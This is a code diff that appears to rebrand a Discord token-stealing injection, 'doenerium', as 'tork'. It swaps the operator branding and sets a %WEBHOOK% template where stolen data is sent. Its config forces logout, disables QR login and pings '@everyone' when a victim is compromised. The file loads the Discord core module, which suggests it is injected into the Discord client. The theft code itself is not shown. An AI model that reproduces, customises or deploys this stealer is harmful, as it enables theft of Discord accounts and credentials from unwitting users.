@@ -11,25 +11,25 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "doenerium",
+    brand: "tork",
 
-    webhook: "REPLACE_ME",
+    webhook: "%WEBHOOK%",
 
     logout: true,
     disable_qr_code: true,
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@doener"],
+    ping: [true, "@everyone"],
 
     embed: {
-        username: "doenerium | t.me/doenerium",
+        username: "tork#4455",
         footer: {
-            text: `doenerium | t.me/doenerium`,
-            icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
+            text: `tork#4455`,
+            icon_url: "https://media.discordapp.net/attachments/1054453037462192288/1085307776168890449/1045804059883487302.gif",
         },
-        href: "https://t.me/doenerium",
-        avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
+        href: "tork#4455",
+        avatar_url: "https://media.discordapp.net/attachments/1054453037462192288/1085307776168890449/1045804059883487302.gif"
     },
 
     badges: {
@@ -854,3 +854,4 @@ async function initialize() {
 }
 
 module.exports = require("./core.asar");
+
